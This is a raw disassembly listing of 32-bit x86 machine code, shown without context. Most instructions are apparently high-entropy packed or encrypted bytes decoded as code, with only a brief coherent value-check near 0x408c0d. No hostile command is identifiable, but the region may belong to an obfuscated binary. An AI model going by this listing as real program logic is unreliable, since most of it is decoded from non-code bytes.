  408af2:	xor    eax,ebx
  408af4:	popa   
  408af5:	or     BYTE PTR [esi],0x42
  408af8:	push   ecx
  408af9:	shl    BYTE PTR [eax-0x60b51bd3],cl
  408aff:	retf   
  408b00:	mov    bh,0xae
  408b02:	je     0x408b6b
  408b04:	sub    BYTE PTR [eax-0x24],dh
  408b07:	es pop es
  408b09:	jp     0x408aeb
  408b0b:	stc    
  408b0c:	mov    dh,ah
  408b0e:	push   ds
  408b0f:	push   ebx
  408b10:	clc    
  408b11:	loop   0x408b0d
  408b13:	pop    ecx
  408b14:	dec    ecx
  408b15:	mov    eax,0xe6c4727f
  408b1a:	xchg   edi,eax
  408b1b:	jo     0x408aaf
  408b1d:	adc    bh,0xf2
  408b20:	cwde   
  408b21:	je     0x408ae3
  408b23:	mov    gs,esp
  408b25:	(bad)
  408b28:	jp     0x408b59
  408b2a:	pop    esp
  408b2b:	mov    ds:0x9f9b316b,eax
  408b30:	out    0xec,eax
  408b32:	sbb    ch,BYTE PTR [eax]
  408b34:	jae    0x408ba1
  408b36:	and    edi,DWORD PTR [ebx-0x2020139d]
  408b3c:	sub    al,0xa7
  408b3e:	jns    0x408b8b
  408b40:	push   ebx
  408b41:	nop
  408b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b43:	aam    0x43
  408b45:	and    DWORD PTR [edi+0x3b],edx
  408b48:	pop    esp
  408b49:	fst    st(0)
  408b4b:	xor    eax,0xdc9d84
  408b50:	xchg   DWORD PTR [edi-0xf6ab8bb],ebx
  408b56:	daa    
  408b57:	shl    BYTE PTR [edx-0x4f],0x86
  408b5b:	push   esp
  408b5c:	jae    0x408b35
  408b5e:	ror    DWORD PTR [ebx-0x19],cl
  408b61:	mov    ebx,0xc0d2486
  408b66:	dec    eax
  408b67:	neg    BYTE PTR [ebx-0x6ec9b9e3]
  408b6d:	xor    DWORD PTR [edi+0x4d],esi
  408b70:	and    cl,BYTE PTR [eax+eax*8]
  408b73:	ins    DWORD PTR es:[edi],dx
  408b74:	push   cs
  408b75:	pop    es
  408b76:	fiadd  WORD PTR [ebx-0x11]
  408b79:	bound  ecx,QWORD PTR [edx+0x66]
  408b7c:	cmp    eax,0x4327d0e1
  408b81:	mov    ebx,esp
  408b83:	ins    BYTE PTR es:[edi],dx
  408b84:	dec    eax
  408b85:	into   
  408b86:	xchg   BYTE PTR [esi-0x30],al
  408b89:	dec    edx
  408b8a:	lea    ebx,[edx+0x7d3ff065]
  408b90:	inc    esp
  408b91:	mov    eax,ds:0xf0c8e09d
  408b96:	mov    al,0x34
  408b98:	fstp   DWORD PTR [esi-0x6904d61]
  408b9e:	in     eax,0xa8
  408ba0:	mov    ds:0xd37fba7e,eax
  408ba5:	sbb    BYTE PTR [edi-0x62fb046a],0x9d
  408bac:	nop
  408bad:	push   es
  408bae:	sbb    al,0x67
  408bb0:	add    al,0x28
  408bb2:	xchg   ecx,eax
  408bb3:	out    dx,al
  408bb4:	inc    ebp
  408bb5:	jbe    0x408bff
  408bb7:	sub    eax,0xcb31a190
  408bbc:	sbb    bl,BYTE PTR ds:[ecx-0x4346ae7e]
  408bc3:	inc    esp
  408bc4:	and    dh,BYTE PTR [ecx+0x74a845ad]
  408bca:	or     eax,0x2394381c
  408bcf:	lea    eax,[ecx-0x57]
  408bd2:	pop    es
  408bd3:	jmp    0x6da5bd61
  408bd8:	mov    al,0x13
  408bda:	in     eax,dx
  408bdb:	inc    edx
  408bdc:	in     al,0x1b
  408bde:	xchg   esp,eax
  408bdf:	sbb    al,0x3d
  408be1:	outs   dx,DWORD PTR ds:[esi]
  408be2:	mov    bl,0x6a
  408be4:	rcl    BYTE PTR [ecx+0x3d],cl
  408be7:	test   BYTE PTR [edi+0x326708fb],ch
  408bed:	mov    DWORD PTR ds:[edi-0x80],esi
  408bf1:	add    al,0x49
  408bf3:	dec    edi
  408bf4:	inc    esi
  408bf5:	retf   0x8afe
  408bf8:	(bad)  
  408bfa:	pop    eax
  408bfb:	in     eax,dx
  408bfc:	lds    ecx,FWORD PTR [ebp+eax*2-0x2f]
  408c00:	mov    DWORD PTR [edi-0x2d700591],ebx
  408c06:	xor    eax,0xf8f69d50
  408c0b:	cs cmc 
  408c0d:	lea    eax,[eax+ecx*1+0x3272f5]
  408c14:	mov    DWORD PTR [ebp+0x8],eax
  408c17:	mov    eax,DWORD PTR [ebp-0xc]
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0xa900552a
  408c4f:	call   0x83c3a4f0
  408c54:	or     al,0x5e
  408c56:	add    DWORD PTR [ebx-0x493cdcab],0xffffffad
  408c5d:	sub    bh,BYTE PTR [esi]
  408c5f:	(bad)  
  408c60:	std    
  408c61:	pop    esi
  408c62:	mov    gs,ecx
  408c64:	mov    al,0x59
  408c66:	fadd   DWORD PTR [edx-0x2f63bb48]
  408c6c:	(bad)  
  408c6d:	std    
  408c6e:	ds clc 
  408c70:	sub    eax,0x499e27af
  408c75:	mov    ch,0xf6
  408c77:	shr    DWORD PTR [ecx*2+0x3596cf7c],0x6c
  408c7f:	and    eax,ebx
  408c81:	mov    al,0xe7
  408c83:	loope  0x408cfb
  408c85:	stos   DWORD PTR es:[edi],eax
  408c86:	pop    esi
  408c87:	xchg   esi,eax
  408c88:	jmp    0xbbdd61fe
  408c8d:	dec    ebp
  408c8e:	dec    esi
  408c8f:	mov    ds:0x57bc84d7,al
  408c94:	(bad)  
  408c95:	out    0xe2,al
  408c97:	jae    0x408cec
  408c99:	repz and ebx,DWORD PTR [esp+eiz*8-0x73]
  408c9e:	daa    
  408c9f:	icebp  
  408ca0:	mov    esi,0x6672ddc9
  408ca5:	sub    al,0x68
  408ca7:	and    ebx,ebx
  408ca9:	(bad)
  408cad:	test   cl,ah
  408caf:	ret    
  408cb0:	in     al,0x3b
  408cb2:	mov    ebx,0x3bcfc7cf
  408cb7:	sub    al,0xe9
  408cb9:	push   ss
  408cba:	arpl   WORD PTR [edx+edi*1],cx
  408cbd:	xchg   BYTE PTR [ecx],al
  408cbf:	(bad)  
  408cc0:	popa   
  408cc1:	fld    TBYTE PTR [ecx]
  408cc3:	repz inc edx
  408cc5:	cmp    BYTE PTR ds:0xfb9193b9,0x9c
  408ccc:	push   esp
  408ccd:	push   cs
  408cce:	xchg   edx,eax
  408ccf:	push   es
  408cd0:	ds xor al,dh
  408cd3:	xor    eax,0x3f26a628
  408cd8:	fwait
  408cd9:	pop    ebp
  408cda:	mov    ecx,0xe2b55074
  408cdf:	mov    ds:0xc82dbde,al
  408ce4:	jbe    0x408c97
  408ce6:	jnp    0x408d05
  408ce8:	fldenv [ebx-0x6d]
  408ceb:	scas   al,BYTE PTR es:[edi]
  408cec:	mov    al,ds:0xaeb02658
  408cf1:	or     DWORD PTR [ecx],edi
  408cf3:	jl     0x408cde
  408cf5:	rcr    DWORD PTR [eax],0x64
  408cf8:	gs out 0xa1,al
  408cfb:	push   ecx
  408cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cfd:	leave  
  408cfe:	arpl   WORD PTR [eax],bx
  408d00:	xor    ebp,DWORD PTR [eax+0x3f]
  408d03:	xor    al,0xe4
  408d05:	mov    eax,ds:0x5801dbfa
  408d0a:	add    al,BYTE PTR [ebx-0x65]
  408d0d:	mov    eax,ds:0xdf261c07
  408d12:	cwde   
  408d13:	adc    esi,0x15e5d6b0
  408d19:	stc    
  408d1a:	add    DWORD PTR [esi],0x3ff6583f
  408d20:	jb     0x408d5e
  408d22:	or     al,BYTE PTR [esi]
  408d24:	mov    ah,0xfc
  408d26:	sub    al,0xce
  408d28:	cmp    DWORD PTR [ebp-0x1e],esi
  408d2b:	fst    DWORD PTR [esp+esi*4-0x79]
  408d2f:	repnz push edi
  408d31:	mov    esp,0x9f9d6a4c
  408d36:	adc    al,0xa8
  408d38:	inc    ecx
  408d39:	mov    dl,0x2b
  408d3b:	and    DWORD PTR [eax-0x4b],0xffffffeb
  408d3f:	and    ebx,esp
  408d41:	repnz mov edx,DWORD PTR [ebp-0x7dca0286]
  408d48:	into   
  408d49:	cld    
  408d4a:	xchg   esi,eax
  408d4b:	push   esp
  408d4c:	dec    eax
  408d4d:	in     al,0x3b
  408d4f:	dec    eax
  408d50:	mov    al,ds:0xc2bf9c34
  408d55:	int    0x4c
  408d57:	xor    eax,ecx
  408d59:	daa    
  408d5a:	mov    eax,0x37e7e28
  408d5f:	push   ss
  408d60:	mov    esp,0x462dc44d
  408d65:	mov    dl,0x57
  408d67:	xor    eax,0x4c60307a
  408d6c:	xor    eax,0xd067258d
  408d71:	dec    eax
  408d72:	(bad)  
  408d73:	call   0x746f:0x8a0067d7
  408d7a:	push   ss
  408d7b:	arpl   sp,ax
  408d7d:	rcl    dh,1
  408d7f:	into   
  408d80:	arpl   WORD PTR [edi+0x4d222b38],dx
  408d86:	jo     0x408deb
  408d88:	mov    edi,0xa90c9a78
  408d8d:	cmp    BYTE PTR [ebp+0x72],0x7b
  408d91:	test   BYTE PTR [ecx-0x103265e3],dl
  408d97:	push   eax
  408d98:	sub    BYTE PTR [eax+0xe],0x8f
  408d9c:	cmc    
  408d9d:	add    edi,DWORD PTR [edi+0x75]
  408da0:	push   0x5b
  408da2:	shr    BYTE PTR [edi+0x62],0xba
  408da6:	call   0x1a4171be
  408dab:	cli    
  408dac:	popf   
  408dad:	adc    ch,BYTE PTR [ebx-0x64]
  408db0:	xchg   ebp,eax
  408db1:	lahf   
  408db2:	adc    eax,edx
  408db4:	or     al,0x77
  408db6:	pop    edx
  408db7:	and    ch,BYTE PTR [eax-0x3fca6ef3]
  408dbd:	pop    eax
  408dbe:	ja     0x408dd3
  408dc0:	xchg   edi,eax
  408dc1:	popa   
  408dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc3:	js     0x408dee
  408dc5:	push   cs
  408dc6:	xchg   ebx,eax
  408dc7:	jns    0x408d9e
  408dc9:	jmp    0xdc2a:0xb2c8d293
  408dd0:	jno    0x408e48
  408dd2:	jmp    0xb72f:0xa2ade1ce
  408dd9:	mov    DWORD PTR [ebp-0x6ab25a37],esp
  408ddf:	jmp    0x408d78
  408de1:	add    ah,BYTE PTR [ecx]
  408de3:	add    DWORD PTR [ebp+edx*8-0x4e],ebx
  408de7:	dec    eax
  408de8:	and    BYTE PTR [ebx-0x6c],ah
  408deb:	mov    ecx,0xf1a2d354
  408df0:	mov    al,0x7e
  408df2:	inc    eax
  408df3:	rol    edi,1
  408df5:	stc    
  408df6:	push   ebp
  408df7:	loope  0x408d86
  408df9:	dec    ebp
  408dfa:	enter  0x4ff9,0x66
  408dfe:	push   ecx
  408dff:	out    0x3b,eax
  408e01:	sbb    esi,edx
  408e03:	mov    ds:0x39b688a6,eax
  408e08:	stc    
  408e09:	mov    eax,0xb6acb041
  408e0e:	xor    al,0xe
  408e10:	retf   
  408e11:	push   ecx
  408e12:	push   ebp
  408e13:	pop    eax
  408e14:	xor    BYTE PTR [ecx+0x8],dl
  408e17:	xchg   ebp,eax
  408e18:	jns    0x408dbc
  408e1a:	(bad)  
  408e1b:	ficom  DWORD PTR [ebx-0x50df0661]
  408e21:	(bad)  
  408e22:	cs das 
  408e24:	scas   eax,DWORD PTR es:[edi]
  408e25:	and    al,0x8f
  408e27:	mov    dl,0x74
  408e29:	rol    dh,cl
  408e2b:	dec    ebp
  408e2c:	sbb    ch,BYTE PTR [edi+eax*8-0x13]
  408e30:	test   al,0xeb
  408e32:	aaa    
  408e33:	jmp    0x2eae:0x565b8deb
  408e3a:	jg     0x408e9d
  408e3c:	mov    al,ds:0x257a931
  408e41:	xchg   esi,eax
  408e42:	xchg   ebx,eax
  408e43:	xchg   edx,eax
  408e44:	test   BYTE PTR ds:0x68172710,0x8c
  408e4b:	dec    ebp
  408e4c:	inc    esp
  408e4d:	loop   0x408e1f
  408e4f:	loope  0x408ebe
  408e51:	or     bh,cl
  408e53:	aam    0x24
  408e55:	push   ebp
  408e56:	dec    ecx
  408e57:	in     eax,0x9
  408e59:	inc    esp
  408e5a:	push   ds
  408e5b:	popf   
  408e5c:	dec    ecx
  408e5d:	es or  eax,0x82001740
  408e63:	add    esi,DWORD PTR [edx-0x47a82ab9]
  408e69:	mov    BYTE PTR [edi+0x4a741c66],ah
  408e6f:	enter  0xd54c,0x1e
  408e73:	cmp    eax,0x54467314
  408e78:	aaa    
  408e79:	or     cl,bh
  408e7b:	jns    0x408ec6
  408e7d:	jne    0x408ec1
  408e7f:	add    BYTE PTR [ecx+eiz*1+0x411d0d73],bh
  408e86:	(bad)  
  408e87:	aaa    
  408e88:	mov    al,ds:0x479750b
  408e8d:	xlat   BYTE PTR ds:[ebx]
  408e8e:	arpl   WORD PTR [ebp+0x2],ax
  408e91:	jp     0x408eef
  408e93:	add    DWORD PTR [eax-0x27],0x2f754b80
  408e9a:	sub    BYTE PTR [ecx-0xd],bl
  408e9d:	les    ebx,FWORD PTR [eax-0x79]
  408ea0:	add    dh,cl
  408ea2:	not    BYTE PTR [ecx]
  408ea4:	shl    BYTE PTR [edx-0x5a99ccad],1
  408eaa:	leave  
  408eab:	es sub al,0xfc
  408eae:	enter  0xa605,0xcc
  408eb2:	fld    TBYTE PTR [esi-0x17]
  408eb5:	dec    DWORD PTR [edx+0x6765e3d6]
  408ebb:	add    al,0xa4
  408ebd:	imul   eax,DWORD PTR [eax+0x63b07124],0x28daefa2
  408ec7:	dec    eax
  408ec8:	out    dx,al
  408ec9:	xor    DWORD PTR [eax],edx
  408ecb:	jmp    0x408e6e
  408ecd:	out    dx,al
  408ece:	je     0x408ec5
  408ed0:	jl     0x408ea4
  408ed2:	addr16 xchg ebx,eax
  408ed4:	aam    0x53
  408ed6:	xchg   ecx,eax
  408ed7:	xchg   edi,eax
  408ed8:	pusha  
  408ed9:	or     al,0x3a
  408edb:	ins    DWORD PTR es:[edi],dx
  408edc:	sbb    BYTE PTR [ecx+0x760d9f41],cl
  408ee2:	sar    DWORD PTR [eax+0x5a],0x2
  408ee6:	push   ss
  408ee7:	jge    0x408ea4
  408ee9:	mov    cl,0xeb
  408eeb:	(bad)  
  408eec:	mov    ebp,0xb4a40de4
  408ef1:	std    
  408ef2:	inc    esp
  408ef3:	lds    esp,FWORD PTR [ebx]
  408ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ef6:	mov    esi,0x81ad9323
  408efb:	lea    ebx,[ebx-0x32843985]
  408f01:	mov    ds:0xd6711313,al
  408f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f07:	ins    BYTE PTR es:[edi],dx
  408f08:	inc    esi
  408f09:	lods   al,BYTE PTR ds:[esi]
  408f0a:	and    eax,ebx
  408f0c:	retf   
  408f0d:	dec    edx
  408f0e:	inc    ecx
  408f0f:	pop    esp
  408f10:	jne    0x408f39
  408f12:	lds    edi,FWORD PTR [eax]
  408f14:	je     0x408f0f
  408f16:	enter  0x54fb,0xa7
  408f1a:	jge    0x408ec7
  408f1c:	mov    bl,0xac
  408f1e:	pushf  
  408f1f:	xchg   ebp,eax
  408f20:	mov    eax,ds:0xe0c69a74
  408f25:	sbb    bl,BYTE PTR [esi-0x4]
  408f28:	fbstp  TBYTE PTR [ecx]
  408f2a:	inc    esp
  408f2b:	inc    edx
  408f2c:	pop    ds
  408f2d:	add    edx,DWORD PTR [esi+0x35]
  408f30:	pop    ss
  408f31:	pop    es
  408f32:	jmp    0xb08b5b94
  408f37:	cmp    dl,dl
  408f39:	sbb    eax,0xb4b2fa0
  408f3e:	dec    ebp
  408f3f:	aas    
  408f40:	xchg   ebx,eax
  408f41:	pushf  
  408f42:	dec    esp
  408f43:	jae    0x408f58
  408f45:	ss aaa 
  408f47:	fs jge 0x408fb3
  408f4a:	or     BYTE PTR [edx+0xecb2898],ch
  408f50:	pop    esi
  408f51:	push   DWORD PTR [ebp-0x57284315]
  408f57:	cmc    
  408f58:	add    BYTE PTR [ecx+0x75],ah
  408f5b:	jl     0x408f64
  408f5d:	jle    0x408fa4
  408f5f:	sub    DWORD PTR [edx-0x32],ebx
  408f62:	or     esp,ebp
  408f64:	loope  0x408f04
  408f66:	mov    BYTE PTR [si],ah
  408f69:	sub    ecx,ebx
  408f6b:	adc    eax,0xff32d081
  408f70:	jae    0x408f80
  408f72:	push   cs
  408f73:	cmp    BYTE PTR [ebp-0x46],bl
  408f76:	and    DWORD PTR [edi+0x5f],edx
  408f79:	xchg   esi,eax
  408f7a:	je     0x408fa2
  408f7c:	add    BYTE PTR [ebx-0x199789b5],bh
  408f82:	xchg   edi,eax
  408f83:	mov    ds:0x616d520e,eax
  408f88:	push   ecx
  408f89:	sub    eax,0xe7c1fdc7
  408f8e:	mov    bl,BYTE PTR [esi-0x67]
  408f91:	cmc    
  408f92:	out    0xe6,eax
  408f94:	add    DWORD PTR ds:0xcb7c598b,eax
  408f9a:	daa    
  408f9b:	lds    esi,FWORD PTR [ebx+0x5c]
  408f9e:	dec    ebx
  408f9f:	push   ds
  408fa0:	cld    
  408fa1:	test   eax,0xb52a7ed1
  408fa6:	mov    edi,0x60cd118
  408fab:	js     0x408fe1
  408fad:	pusha  
  408fae:	test   eax,0x7b19225e
  408fb3:	pop    ecx
  408fb4:	sbb    al,0xc6
  408fb6:	iret   
  408fb7:	mov    ebx,0xc90d32f3
  408fbc:	into   
  408fbd:	in     eax,0xcd
  408fbf:	call   DWORD PTR [esi-0x75]
  408fc2:	ds add al,0xaa
  408fc5:	mov    bl,0x47
  408fc7:	mov    dl,BYTE PTR [esi-0x6a204835]
  408fcd:	mov    edi,0x486596aa
  408fd2:	lea    ebx,[edx]
  408fd4:	xlat   BYTE PTR ds:[ebx]
  408fd5:	test   ax,0x67e4
  408fd9:	pop    es
  408fda:	adc    cl,BYTE PTR [esi+0x7dbeb447]
  408fe0:	sbb    ch,BYTE PTR fs:[edi-0x1b]
  408fe4:	shl    BYTE PTR [esp+esi*2],cl
  408fe7:	pop    edx
  408fe8:	(bad)  
  408fe9:	push   es
  408fea:	jg     0x408fa8
  408fec:	adc    esi,DWORD PTR [eax+0x37]
  408fef:	push   esp
  408ff0:	je     0x408ffa
  408ff2:	dec    esi
  408ff3:	xchg   esp,eax
  408ff4:	push   ecx
  408ff5:	lds    esp,FWORD PTR ds:[edi-0x3b]
  408ff9:	or     bh,BYTE PTR [eax-0x31b0c0d5]
  408fff:	pop    ebp
  409000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409001:	shl    ebx,0xb4
  409004:	icebp  
  409005:	pop    ebp
  409006:	pop    esp
  409007:	test   DWORD PTR [eax+ebx*4+0xe40f563],0x235d08e2
  409012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409013:	xor    BYTE PTR [ebx],dl
  409015:	pop    ecx
  409016:	mov    dl,BYTE PTR cs:[ebx]
  409019:	mov    ebx,0x2ad7780d
  40901e:	xchg   edx,eax
  40901f:	pusha  
  409020:	outs   dx,DWORD PTR ds:[esi]
  409021:	pop    edi
  409022:	ret    
  409023:	fisttp QWORD PTR [ecx+0x57]
  409026:	add    bh,al
  409028:	test   DWORD PTR [edx],ebp
  40902a:	mov    ebp,0xa8444263
  40902f:	scas   al,BYTE PTR es:[edi]
  409030:	shl    eax,1
  409032:	ins    BYTE PTR es:[edi],dx
  409033:	les    edx,FWORD PTR [eax]
  409035:	mov    esi,0x910e121e
  40903a:	fdivr  st,st(7)
  40903c:	mov    bh,0xef
  40903e:	stos   BYTE PTR es:[edi],al
  40903f:	add    DWORD PTR [ecx+0x62],eax
  409042:	fwait
  409043:	jl     0x40902f
  409045:	cmp    DWORD PTR [edi+0x49],edx
  409048:	std    
  409049:	add    ebx,edi
  40904b:	pop    es
  40904c:	lds    ebx,FWORD PTR [esi-0x298fe654]
  409052:	outs   dx,BYTE PTR ds:[esi]
  409053:	inc    esp
  409054:	mov    dl,0x28
  409056:	clc    
  409057:	push   es
  409058:	inc    edx
  409059:	mov    ebp,DWORD PTR [edx+edx*2-0x4a]
  40905d:	leave  
  40905e:	pop    es
  40905f:	xlat   BYTE PTR ds:[ebx]
  409060:	pop    ss
  409061:	push   ecx
  409062:	push   eax
  409063:	stc    
  409064:	fdivr  st,st(1)
  409066:	in     al,dx
  409067:	ud2    
  409069:	jmp    0xcaba48a0
  40906e:	sbb    BYTE PTR [eax-0x77],al
  409071:	sahf   
  409072:	jae    0x40904c
  409074:	test   dh,ch
  409076:	cmp    bl,BYTE PTR [edx+0x1]
  409079:	jg     0x4090ef
  40907b:	mov    al,ds:0x63d58cf7
  409080:	add    al,BYTE PTR [ebx+0x79]
  409083:	push   ds
  409084:	int3   
  409085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409086:	xor    ah,BYTE PTR [esi-0x48]
  409089:	scas   eax,DWORD PTR es:[edi]
  40908a:	cdq    
  40908b:	clc    
  40908c:	sbb    esp,DWORD PTR [eax-0x1f66db20]
  409092:	jo     0x4090c4
  409094:	xchg   bl,bl
  409096:	cld    
  409097:	retf   
  409098:	icebp  
  409099:	mov    eax,ds:0x75f22a4d
  40909e:	jge    0x409034
  4090a0:	cmp    eax,0x407e0144
  4090a5:	push   ss
  4090a6:	lea    ebp,[ecx-0x1615b2a7]
  4090ac:	xor    al,0xd4
  4090ae:	je     0x409112
  4090b0:	jae    0x409091
  4090b2:	mov    ch,0x9b
  4090b4:	stos   BYTE PTR es:[edi],al
  4090b5:	(bad)  
  4090b6:	outs   dx,DWORD PTR ds:[esi]
  4090b7:	dec    esi
  4090b8:	pusha  
  4090b9:	pop    ebx
  4090ba:	(bad)  
  4090bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090bc:	jb     0x409121
  4090be:	fcom   DWORD PTR [edx-0x80]
  4090c1:	es sbb al,0x63
  4090c4:	xchg   ecx,eax
  4090c5:	push   ds
  4090c6:	ret    0xd8d6
  4090c9:	js     0x40907d
  4090cb:	or     al,0x64
  4090cd:	es enter 0x6128,0x8a
  4090d2:	call   0xe931:0xb18ddad8
  4090d9:	enter  0xb865,0xa
  4090dd:	shl    eax,cl
  4090df:	sbb    eax,0xffffffc3
  4090e2:	in     al,dx
  4090e3:	cmp    al,0x22
  4090e5:	jge    0x40908e
  4090e7:	(bad)  
  4090e8:	jno    0x409097
  4090ea:	std    
  4090eb:	sub    al,0xcc
  4090ed:	fwait
  4090ee:	xor    BYTE PTR ss:[edx],al
  4090f1:	ret    
  4090f2:	cwde   
  4090f3:	pop    esp
  4090f4:	test   al,0x1e
  4090f6:	push   edi
  4090f7:	cmp    edi,esp
  4090f9:	or     ch,dh
  4090fb:	or     bl,BYTE PTR [edi-0x74]
  4090fe:	dec    edi
  4090ff:	leave  
  409100:	mov    ah,0xf0
  409102:	outs   dx,BYTE PTR ds:[esi]
  409103:	inc    ebx
  409104:	push   es
  409105:	xchg   edi,eax
  409106:	aas    
  409107:	cld    
  409108:	in     al,dx
  409109:	push   ds
  40910a:	adc    BYTE PTR [esi],bh
  40910c:	cmp    DWORD PTR [edx+ebp*2],esi
  40910f:	jecxz  0x40914b
  409111:	aas    
  409112:	int    0xf3
  409114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409115:	inc    edx
  409116:	icebp  
  409117:	inc    edx
  409118:	and    DWORD PTR [ecx+esi*1+0x4c13f5b2],ecx
  40911f:	call   0xb8d4:0xb0589966
  409126:	sahf   
  409127:	xor    al,0x5f
  409129:	fld    DWORD PTR [edi]
  40912b:	dec    edx
  40912c:	adc    ah,BYTE PTR [ecx]
  40912e:	inc    edx
  40912f:	data16 fidiv DWORD PTR [edx-0x3ba62daa]
  409136:	(bad)  
  409137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409139:	out    dx,al
  40913a:	xchg   ebp,eax
  40913b:	cmp    bl,BYTE PTR [ebp+0x354f653e]
  409141:	xchg   edx,eax
  409142:	mov    DWORD PTR [ebx],eax
  409144:	adc    ch,BYTE PTR [esi]
  409146:	js     0x409167
  409148:	xor    al,0x96
  40914a:	push   eax
  40914b:	test   BYTE PTR [edx-0x772c5c83],dl
  409151:	stc    
  409152:	xor    ch,ah
  409154:	dec    esp
  409155:	xchg   DWORD PTR [ecx],edi
  409157:	mov    eax,ds:0xdc4fe441
  40915c:	rcr    bh,1
  40915e:	leave  
  40915f:	std    
  409160:	js     0x40917e
  409162:	cmp    ebx,DWORD PTR [ebx+0xe]
  409165:	aas    
  409166:	mov    eax,DWORD PTR [eiz*1-0x52ce67f9]
  40916d:	xor    al,0x22
  40916f:	jge    0x4090ff
  409171:	icebp  
  409172:	lods   eax,DWORD PTR ds:[esi]
  409173:	xchg   esi,eax
  409174:	push   ss
  409175:	cmc    
  409176:	mov    ebx,0x79fab241
  40917b:	sti    
  40917c:	std    
  40917d:	(bad)  
  40917e:	xchg   ebp,eax
  40917f:	sub    BYTE PTR [ebp-0x31e0594e],al
  409185:	sub    ch,BYTE PTR [ebx-0x17]
  409188:	push   eax
  409189:	xchg   ecx,eax
  40918a:	pop    es
  40918b:	(bad)  
  40918c:	gs mov ebx,0xde03d2ae
  409192:	lock mov eax,ds:0x52f70ec6
  409198:	mov    ebx,0xac12eb59
  40919d:	repz fwait
  40919f:	cmp    al,BYTE PTR [eax+0x62]
  4091a2:	fdiv   QWORD PTR [edi-0x167aecf4]
  4091a8:	jecxz  0x409188
  4091aa:	and    al,0xb
  4091ac:	mov    ds:0x96783ff,eax
  4091b1:	sub    edi,ebp
  4091b3:	js     0x409176
  4091b5:	int    0xb7
  4091b7:	aam    0x9c
  4091b9:	adc    eax,0xacbb0e4
  4091be:	mov    ah,0x9d
  4091c0:	call   DWORD PTR [ecx]
  4091c2:	ss lock mov ebx,0xf4e67a59
  4091c9:	call   0x5a61:0xdfc71f6
  4091d0:	cli    
  4091d1:	ret    0x88c6
  4091d4:	or     esi,DWORD PTR [edi+0x56]
  4091d7:	enter  0x96ef,0xf6
  4091db:	xor    esp,ebx
  4091dd:	xchg   ebx,eax
  4091de:	mov    ds:0x9bfccd8,eax
  4091e3:	cmp    dl,BYTE PTR [esi+0x17]
  4091e6:	fs pop ebx
  4091e8:	or     al,0x2e
  4091ea:	sbb    DWORD PTR [edx],edx
  4091ec:	dec    esi
  4091ed:	pop    ebp
  4091ee:	ds jb  0x409191
  4091f1:	not    BYTE PTR [edx-0x54c45616]
  4091f7:	mov    bh,0x13
  4091f9:	sub    ch,BYTE PTR [ecx]
  4091fb:	pop    esp
  4091fc:	in     al,dx
  4091fd:	call   0xf6cf:0xe3977b28
  409204:	or     al,0xb9
  409206:	add    eax,0x14322011
  40920b:	jmp    0xf5176546
  409210:	stc    
  409211:	shl    BYTE PTR [eax-0x81dc406],cl
  409217:	push   es
  409218:	sub    DWORD PTR [edx+0x1d],0xffffffe4
  40921c:	bnd jmp 0xf8706150
  409222:	mov    DWORD PTR [edi-0x3a08223e],ecx
  409228:	xor    BYTE PTR [eax+0x68],dh
  40922b:	cli    
  40922c:	fs push ss
  40922e:	sub    al,0xbb
  409230:	bound  eax,QWORD PTR [edx-0x248db7e3]
  409236:	les    eax,FWORD PTR [ebp+0x36]
  409239:	cmc    
  40923a:	dec    esi
  40923b:	fcomp  QWORD PTR [esi-0xf]
  40923e:	jmp    0x409251
  409240:	jbe    0x409219
  409242:	loop   0x409206
  409244:	mov    eax,ds:0x15e429fe
  409249:	out    dx,al
  40924a:	jo     0x409286
  40924c:	jge    0x409217
  40924e:	lahf   
  40924f:	jnp    0x4091d7
  409251:	cs inc esp
  409253:	sub    BYTE PTR [edi+ebx*4+0x76],dh
  409257:	or     DWORD PTR cs:[edi+ebp*4+0x65],ebx
  40925c:	icebp  
  40925d:	rcl    DWORD PTR fs:[edx-0x42],1
  409261:	dec    eax
  409262:	test   eax,0x8bfd7829
  409267:	iret   
  409268:	ins    DWORD PTR es:[edi],dx
  409269:	pop    eax
  40926a:	jmp    0x88a2:0x88578036
  409271:	lods   al,BYTE PTR ds:[esi]
  409272:	xchg   esi,eax
  409273:	loopne 0x4091f9
  409275:	cmp    eax,0x7494c934
  40927a:	repnz adc BYTE PTR [eax+0x6],bl
  40927e:	mov    ds:0x6de5b780,al
  409283:	or     DWORD PTR [ebp-0x58],eax
  409286:	adc    BYTE PTR ds:0x1fabe3a,0x19
  40928d:	pop    es
  40928e:	fcmovnb st,st(1)
  409290:	push   cs
  409291:	test   eax,0x62fff4d8
  409296:	stc    
  409297:	lods   al,BYTE PTR ds:[esi]
  409298:	not    DWORD PTR [edx-0x2d]
  40929b:	inc    ebp
  40929c:	pop    ss
  40929d:	nop
  40929e:	adc    esp,DWORD PTR ds:0x4e9bd20c
  4092a4:	push   ebp
  4092a5:	add    eax,0xed2c72e
  4092aa:	adc    esi,DWORD PTR [edx-0x57159e4e]
  4092b0:	xor    BYTE PTR [edx-0x63],ch
  4092b3:	mov    cl,0x4b
  4092b5:	xor    ah,0xf6
  4092b8:	lea    ecx,[eax+0x63a75b72]
  4092be:	and    eax,0xcc7df215
  4092c3:	in     eax,0x51
  4092c5:	sbb    ebx,DWORD PTR [edx+0x5d]
  4092c8:	cmp    esp,DWORD PTR [ecx-0x12f33199]
